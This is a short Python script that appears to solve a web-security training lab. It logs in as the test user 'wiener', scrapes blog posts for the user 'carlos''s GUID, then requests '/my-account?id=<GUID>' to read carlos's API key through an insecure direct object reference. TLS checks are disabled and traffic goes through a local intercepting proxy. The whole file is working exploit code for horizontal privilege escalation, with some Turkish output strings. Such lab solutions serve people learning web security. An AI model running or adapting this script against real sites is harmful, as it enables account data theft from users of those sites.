import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup
import re

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080' }


def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value']
    return csrf


def carlos_guid(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    res = r.text
    post_ids = re.findall(r'postId=(\w+)"', res)
    unique_post_id = list(set(post_ids))

    for i in unique_post_id:
        r = s.get(url + "/post?postId=" + i, verify=False, proxies=proxies)
        res = r.text
        if 'carlos' in res:
            print("(+) calosu buldum")
            guid_match = re.findall(r"userId=(.*)'", res)
            if guid_match:
                guid = guid_match[0]
                return guid
            else:
                print("[-] User ID not found in response")
                return None

    print("[-] No 'carlos' in any post")
    return None

def carlos_api_key(s,url):
     login_url = url+"/login"
     my_account= url+"/my-account"
     csrf_token = get_csrf_token(s,login_url)
     print("(+) Login viener")
     data = {"csrf": csrf_token,
            "username": "wiener",
            "password": "peter"}
    
     r = s.post(login_url, data=data, verify=False, proxies=proxies)
     r = s.post(my_account,  verify=False, proxies=proxies)
     res = r.text
     if "Log out" in res:
        print("[+] Giriş okey")
        guid = carlos_guid(s, url)
        carlos_url =  url + "/my-account?id=" + guid
        r = s.get(carlos_url,  verify=False, proxies=proxies)
        res = r.text
        if 'carlos' in res:
            print("[+] carlos api......")
            api_key = re.search("Your API Key is:(.*)", res).group(1)
            print("api key"+ api_key.split('</div>')[0])
        else:
               print("[+] carlos api bulamadım")

     else:
        print("[+] Giriş yok")
        sys.exit(-1)
    


if __name__ == "__main__":
    if len(sys.argv) !=2:
          print("(+) usage %s <url>" %sys.argv[0])
          print("(+) Example Url  %s www.example.com " %sys.argv[0])
          sys.exit(-1)
    
  
    s = requests.Session()
    url = sys.argv[1]
    print("[+] Admin panel arıyorum.......")
    carlos_api_key(s, url)



